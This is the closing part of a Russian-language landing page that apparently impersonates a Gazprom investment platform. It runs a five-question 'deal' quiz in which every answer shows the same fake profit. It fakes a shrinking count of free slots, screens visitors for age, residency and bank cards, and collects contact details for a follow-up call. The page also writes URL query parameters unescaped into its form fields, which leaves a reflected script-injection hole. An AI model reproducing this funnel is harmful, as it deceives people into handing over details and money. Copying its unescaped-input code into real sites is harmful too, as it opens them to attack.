      @media (prefers-color-scheme: dark) {
        .dark\:gpt-border {
          border-width: 1px !important;
        }

        .dark\:gpt-border-none {
          border-style: none !important;
        }

        .dark\:gpt-border-slate-700 {
          --tw-border-opacity: 1 !important;
          border-color: rgb(51 65 85 / var(--tw-border-opacity)) !important;
        }

        .dark\:gpt-border-gray-600 {
          --tw-border-opacity: 1 !important;
          border-color: rgb(75 85 99 / var(--tw-border-opacity)) !important;
        }

        .dark\:gpt-border-b-slate-700 {
          --tw-border-opacity: 1 !important;
          border-bottom-color: rgb(
            51 65 85 / var(--tw-border-opacity)
          ) !important;
        }

        .dark\:gpt-border-t-slate-700 {
          --tw-border-opacity: 1 !important;
          border-top-color: rgb(51 65 85 / var(--tw-border-opacity)) !important;
        }

        .dark\:gpt-border-t-slate-600 {
          --tw-border-opacity: 1 !important;
          border-top-color: rgb(
            71 85 105 / var(--tw-border-opacity)
          ) !important;
        }

        .dark\:gpt-bg-gray-800 {
          --tw-bg-opacity: 1 !important;
          background-color: rgb(31 41 55 / var(--tw-bg-opacity)) !important;
        }

        .dark\:gpt-bg-slate-900 {
          --tw-bg-opacity: 1 !important;
          background-color: rgb(15 23 42 / var(--tw-bg-opacity)) !important;
        }

        .dark\:gpt-bg-slate-800 {
          --tw-bg-opacity: 1 !important;
          background-color: rgb(30 41 59 / var(--tw-bg-opacity)) !important;
        }

        .dark\:gpt-bg-\[\#0F172A_\!important\] {
          background-color: #0f172a !important;
        }

        .dark\:gpt-bg-gray-700 {
          --tw-bg-opacity: 1 !important;
          background-color: rgb(55 65 81 / var(--tw-bg-opacity)) !important;
        }

        .dark\:gpt-bg-slate-600 {
          --tw-bg-opacity: 1 !important;
          background-color: rgb(71 85 105 / var(--tw-bg-opacity)) !important;
        }

        .dark\:gpt-bg-slate-700 {
          --tw-bg-opacity: 1 !important;
          background-color: rgb(51 65 85 / var(--tw-bg-opacity)) !important;
        }

        .dark\:gpt-bg-green-900 {
          --tw-bg-opacity: 1 !important;
          background-color: rgb(20 83 45 / var(--tw-bg-opacity)) !important;
        }

        .dark\:gpt-text-slate-200 {
          --tw-text-opacity: 1 !important;
          color: rgb(226 232 240 / var(--tw-text-opacity)) !important;
        }

        .dark\:gpt-text-gray-200 {
          --tw-text-opacity: 1 !important;
          color: rgb(229 231 235 / var(--tw-text-opacity)) !important;
        }

        .dark\:gpt-text-slate-100 {
          --tw-text-opacity: 1 !important;
          color: rgb(241 245 249 / var(--tw-text-opacity)) !important;
        }

        .dark\:gpt-text-green-500 {
          --tw-text-opacity: 1 !important;
          color: rgb(34 197 94 / var(--tw-text-opacity)) !important;
        }

        .dark\:gpt-text-gray-300 {
          --tw-text-opacity: 1 !important;
          color: rgb(209 213 219 / var(--tw-text-opacity)) !important;
        }

        .dark\:gpt-text-slate-50 {
          --tw-text-opacity: 1 !important;
          color: rgb(248 250 252 / var(--tw-text-opacity)) !important;
        }

        .dark\:gpt-text-slate-500 {
          --tw-text-opacity: 1 !important;
          color: rgb(100 116 139 / var(--tw-text-opacity)) !important;
        }

        .dark\:gpt-text-green-200 {
          --tw-text-opacity: 1 !important;
          color: rgb(187 247 208 / var(--tw-text-opacity)) !important;
        }

        .dark\:gpt-text-amber-500 {
          --tw-text-opacity: 1 !important;
          color: rgb(245 158 11 / var(--tw-text-opacity)) !important;
        }

        .dark\:gpt-outline-none {
          outline: 2px solid transparent !important;
          outline-offset: 2px !important;
        }

        .dark\:hover\:gpt-bg-gray-700:hover {
          --tw-bg-opacity: 1 !important;
          background-color: rgb(55 65 81 / var(--tw-bg-opacity)) !important;
        }

        .dark\:hover\:gpt-bg-slate-700:hover {
          --tw-bg-opacity: 1 !important;
          background-color: rgb(51 65 85 / var(--tw-bg-opacity)) !important;
        }
      }

      .\[\&\>\*\]\:gpt-px-3 > * {
        padding-left: 12px !important;
        padding-right: 12px !important;
      }
    </style>
  </head>

  <body>
    <div class="wraper">
      <div class="title__card">
        <div class="container">
          <div class="title__content">
            <div class="title__text">
              <img src="images/gas.png" class="teslalogo" alt="imgone" />
              <h1 class="tetile__title">
                Узнайте сколько вы можете зарабатывать прямо сейчас!
              </h1>
              <p class="title__text-p">
                По статистике, <span>только 8.2% наблюдателей</span> добиваются
                максимального результата теста, но 94% из них успешно
                зарабатывают в последствии. Пройдите бесплатный тест и будьте
                среди лучших 👇
              </p>
              <button class="title__btn" type="button">
                Пройдите тест и узнайте свои шансы
              </button>
            </div>
            <div class="title__img-wrap">
              <img class="title__img" alt="imgone" src="images/1221.webp" />
            </div>
          </div>
        </div>
      </div>
      <div class="card card__one">
        <div class="container">
          <div class="content content__one">
            <div class="text-content text-content__one">
              <h2 class="title title__one">Первая сделка</h2>
              <p class="desc desc__one">
                В регионах прогнозируют холодную зиму, а Газпром уже начал
                закачку газа в хранилища.
              </p>
              <div class="question question__one">
                <span>Вопрос :</span> Вырастет ли цена на газ для населения
                зимой?
              </div>
              <div class="question question__one put">
                <img
                  class="dop-image"
                  src="images/j-WHypv41-Ahyob-Pb8-Hma-Vw-s1100.jpg"
                  alt
                />
              </div>

              <div class="balance">
                Ваш баланс: <span class="balance__count"></span>
                <span class="valuteBalance">руб.</span>
              </div>
            </div>
            <div class="img-wrap">
              <img
                id="img1"
                class="img img__one"
                src="images/1.webp"
                alt="imgone"
              />
              <button id="prof1" class="profit">
                Ваша прибыль: <span id="count1" class="count">12500 </span>
                <span class="valute">руб.</span>
              </button>
              <div id="btncontainer1" class="btn__container">
                <button id="b1" class="btn__buy">Да</button>
                <button id="s1" class="btn__sell">Нет</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="card card__two">
        <div class="container">
          <div class="content content__two">
            <div class="text-content text-content__two">
              <h2 class="title title__two">Вторая сделка</h2>
              <p class="desc desc__two">
                Переговоры по «Силе Сибири-2» продолжаются. Пекин требует
                скидок, а Газпром — гарантированных объёмов.
              </p>
              <div class="question question__two">
                <span>Вопрос :</span>Увеличится ли экспорт российского газа в
                Китай в этом году?
              </div>
              <div class="question question__one put">
                <img class="dop-image" src="images/flag.webp" alt />
              </div>
              <div class="balance">
                Ваш баланс: <span class="balance__count"></span
                ><span class="valuteBalance">руб.</span>
              </div>
            </div>
            <div class="img-wrap">
              <img
                id="img2"
                class="img img__two"
                src="images/1.webp"
                alt="imgone"
              />
              <button id="prof2" class="profit">
                Ваша прибыль: <span id="count2" class="count">12500 </span>
                <span class="valute">руб.</span>
              </button>
              <div id="btncontainer2" class="btn__container">
                <button id="b2" class="btn__buy">Да</button>
                <button id="s2" class="btn__sell">Нет</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="card card__three">
        <div class="container">
          <div class="content content__three">
            <div class="text-content text-content__three">
              <h2 class="title title__three">Третья сделка</h2>
              <p class="desc desc__three">
                ЕС заявляет о намерении полностью отказаться от российского
                газа, но цены на спотовом рынке снова растут.
              </p>
              <div class="question question__three">
                <span>Вопрос :</span>Повысится ли цена на газ в Европе в
                следующем квартале?
              </div>
              <div class="question question__one put">
                <img class="dop-image" src="images/factory.jpg" alt />
              </div>
              <div class="balance">
                Ваш баланс: <span class="balance__count"></span
                ><span class="valuteBalance">руб.</span>
              </div>
            </div>
            <div class="img-wrap">
              <img
                id="img3"
                class="img img__three"
                src="images/1.webp"
                alt="imgone"
              />
              <button id="prof3" class="profit">
                Ваша прибыль: <span id="count3" class="count">12500 </span>
                <span class="valute">руб.</span>
              </button>
              <div id="btncontainer3" class="btn__container">
                <button id="b3" class="btn__buy">Да</button>
                <button id="s3" class="btn__sell">Нет</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="card card__four">
        <div class="container">
          <div class="content content__four">
            <div class="text-content text-content__four">
              <h2 class="title title__four">Четвертая сделка</h2>
              <p class="desc desc__four">
                Из-за снижения экспорта в Европу доходы Газпрома упали, но
                компания развивает новые рынки.
              </p>
              <div class="question question__four">
                <span>Вопрос :</span>Сохранит ли Газпром прибыльность в этом
                году?
              </div>
              <div class="question question__one put">
                <img class="dop-image" src="images/gz3.jpeg" alt />
              </div>
              <div class="balance">
                Ваш баланс: <span class="balance__count"></span
                ><span class="valuteBalance">руб.</span>
              </div>
            </div>
            <div class="img-wrap">
              <img
                id="img4"
                class="img img__four"
                src="images/1.webp"
                alt="imgone"
              />
              <button id="prof4" class="profit">
                Ваша прибыль: <span id="count4" class="count">12500 </span>
                <span class="valute">руб.</span>
              </button>
              <div id="btncontainer4" class="btn__container">
                <button id="b4" class="btn__buy">Да</button>
                <button id="s4" class="btn__sell">Нет</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="card card__five">
        <div class="container">
          <div class="content content__five">
            <div class="text-content text-content__five">
              <h2 class="title title__five">Пятая сделка</h2>
              <p class="desc desc__five">
                Газпром сообщил о заморозке части проектов газификации в
                отдалённых регионах.
              </p>
              <div class="question question__five">
                <span>Вопрос :</span>Снизится ли уровень газификации в России в
                ближайшие годы?
              </div>
              <div class="question question__one put">
                <img class="dop-image" src="images/gz2.jpeg" alt />
              </div>
              <div class="balance">
                Ваш баланс: <span class="balance__count"></span
                ><span class="valuteBalance">руб.</span>
              </div>
            </div>
            <div class="img-wrap">
              <img
                id="img5"
                class="img img__five"
                src="images/1.webp"
                alt="imgone"
              />
              <button id="prof5" class="profit">
                Ваша прибыль: <span id="count5" class="count">12500 </span>
                <span class="valute">руб.</span>
              </button>
              <div id="btncontainer5" class="btn__container">
                <button id="b5" class="btn__buy">Да</button>
                <button id="s5" class="btn__sell">Нет</button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="card final__card">
        <div class="container">
          <div class="final__card-content">
            <div class="final__card-desc">
              <h2 class="final__title">Поздравляем!</h2>
              <p class="final__title-text">
                У Вас отличное понимание рынка: будь это настоящие сделки, Вы бы
                заработали <span class="finalCount"></span
                ><span class="finalValute">руб.</span>
              </p>
              <p class="final__title-text">
                <!--                Вы получили бесплатный доступ и <span style="font-size: 22px; text-decoration: underline;font-weight: 700; color: rgb(5, 5, 74);">привественный бонус</span> от платформы Газпром  🎁 !-->
                Оставьте свои контактные данные, чтобы получить доступ.
              </p>
              <p class="final__title-text">
                <!--			  Чтобы забрать подарок завершите регистрацию 👇-->
                После регистрации обязательно дождитесь звонка нашего менеджера
                для подтверждения регистрации.
              </p>
              <!-- <p class="final__title-text">
                После регистрации обязательно возьмите трубку, сотрудник Газпром  с вами свяжется
              </p> -->
              <div class="final__img">
                <img
                  src="images/finalphoto.png"
                  width="300px"
                  height="300px"
                  alt="l"
                />
              </div>
            </div>
            <form
              class="form _main-form contact-form freg thin rounded"
              id="main-form"
              method="post"
            >
              <div class="text-block-6">
                <h2 class="form-heading" style="text-align: center">
                  Пройдите регистрацию для начала работы
                </h2>
              </div>
              <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
              <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
              <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'>
              <input type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
              type="hidden" id="source" value='<?= $_GET['source'] ?>'>
            </form>
          </div>
        </div>
      </div>
    </div>

    <!--------- QUESTION 1 --------->
    <div id="modal-1" class="modal hidden">
      <div class="modal__content">
        <p class="modal__question">Вам более 25 лет?</p>
        <div class="modal__actions">
          <a class="modal__button--first" href="err.html">Нет</a>
          <button class="modal__button--first yes">Да</button>
        </div>
      </div>
    </div>
    <!--------- QUESTION 2 --------->
    <div id="modal-2" class="modal hidden">
      <div class="modal__content">
        <p class="modal__question">
          Вы являетесь гражданином или резидентом Российской Федерации?
        </p>
        <div class="modal__actions">
          <a class="modal__button--second" href="err.html">Нет</a>
          <button class="modal__button--second yes">Да</button>
        </div>
      </div>
    </div>
    <!--------- QUESTION 3 --------->
    <div id="modal-3" class="modal hidden">
      <div class="modal__content">
        <p class="modal__question">Есть ли у вас проблемы с картами?*</p>
        <div class="modal__actions">
          <button class="modal__button--third yes">Нет</button>
          <a class="modal__button--third" href="err.html">Да</a>
        </div>
        <span class="modal__additional"
          ><span class="accent"
            >** Данный вопрос необходим, чтобы мы могли обеспечить корректный
            вывод средств.</span
          ></span
        >
      </div>
    </div>

    <script src="js/confetti.browser.min.js"></script>
    <script src="js/modal.js"></script>
    <script>
      const btnb = document
        .querySelectorAll(".btn__buy")
        .forEach((el) => el.addEventListener("click", onB));
      const btns = document
        .querySelectorAll(".btn__sell")
        .forEach((el) => el.addEventListener("click", onB));
      function onB() {
        var end = Date.now() + 5 * 60;
        var colors = [
          "#000",
          "#ff282828",
          "#f3f3f3",
          "#32c732",
          "#ffcc00",
          "#2b00ff",
          "#b91802",
        ];
        (function frame() {
          confetti({
            particleCount: 7,
            angle: 60,
            spread: 80,
            origin: {
              x: 0,
            },
            colors: colors,
          });
          confetti({
            particleCount: 7,
            angle: 120,
            spread: 80,
            origin: {
              x: 1,
            },
            colors: colors,
          });
          if (Date.now() < end) {
            requestAnimationFrame(frame);
          }
        })();
      }
    </script>
    <script src="js/indexB.js"></script>

    <style>
      .chek {
        margin-bottom: 15px;
        width: max-content;
      }

      @media (max-width: 450px) {
        .chek {
          margin-left: 25px;
        }
      }
    </style>

    <script>
      $(".year").text(new Date().getFullYear());
    </script>
    <script type="text/javascript">
      function randNum(min, max) {
        return Math.floor(Math.random() * (max - min + 1) + min);
      }
      $("#onlinePin").text(randNum(120, 195));
      var freeSlots = randNum(14, 20);
      $("#onlineSlots").text(freeSlots);
      setInterval(function () {
        if (freeSlots > 2) {
          freeSlots = freeSlots - 1;
          $("#onlineSlots").text(freeSlots);
        }
      }, randNum(9000, 25000));
    </script>
    <style>
      .loader {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: url(images/spinner.gif) no-repeat center center;
        z-index: 999999;
      }
    </style>

    <script src="loadAssets.js?v=35252"></script>

    <script>
      window.onload = function () {
        var thx = localStorage.getItem("thanks");
        if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var thx = localStorage.getItem("thanks");
        if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
